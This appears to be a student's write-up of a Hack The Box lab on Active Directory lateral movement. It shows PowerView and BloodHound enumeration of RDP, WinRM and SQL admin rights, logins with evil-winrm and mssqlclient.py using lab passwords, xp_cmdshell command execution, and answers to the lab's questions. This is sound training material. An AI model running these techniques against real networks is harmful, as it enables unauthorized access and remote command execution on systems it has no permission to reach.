# 🦑 Privileged Access

## Privileged Access

### Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines.

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on the host

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
<SNIP>
```

all Domain Users (meaning `all` users in the domain) can RDP to this host.

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

<figure><img src="../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Once we control a user, we can check what remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>or <code>Analysis</code> tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p></figcaption></figure>

### WinRM

We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group.

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Adding the Cypher Query as a Custom Query in BloodHound**

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Establishing WinRM Session from Windows**

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

and on a linux host we can use `evil-winrm`

Install `evil-winrm ->`

```shell-session
ElFelixi0@htb[/htb]$ gem install evil-winrm
```

And to conect to the host with a set of valid credentials ->

```shell-session
ElFelixi0@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
```

### SQL Server Admin

A way that you may find SQL server credentials other then via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings

Here is a query for bloodhound to find `SQL Admin Rights` in the `Node Info` tab for a given user

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

**Enumerating MSSQL Instances with PowerUpSQL**

```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands.

```powershell-session
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

```shell-session
ElFelixi0@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Then we can look at the commands we can launch on the SQL server like `enable_xp_cmdshell` to enable the [xp\_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

```shell-session
SQL> enable_xp_cmdshell
```

Now we can run commands in the format `xp_cmdshell <command>`

```shell-session
xp_cmdshell whoami /priv
```

_**What other user in the domain has CanPSRemote rights to a host?**_

So i start by launching sharphound on my windows machine, then downloading it to my attackbox via a evil-winrm session, then i launch bloodhound and upload all the data ->

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

_I enter this raw query ->_

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>BDAVIS</p></figcaption></figure>

_**What host can this user access via WinRM? (just the computer name)**_

```
ACADEMY-EA-DC01
```

_**Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.**_

_**We find the SQL admin rights ->**_

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

via a evil-winrm session i upload mssqlclient.exe to the RDP session and launch the attack

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
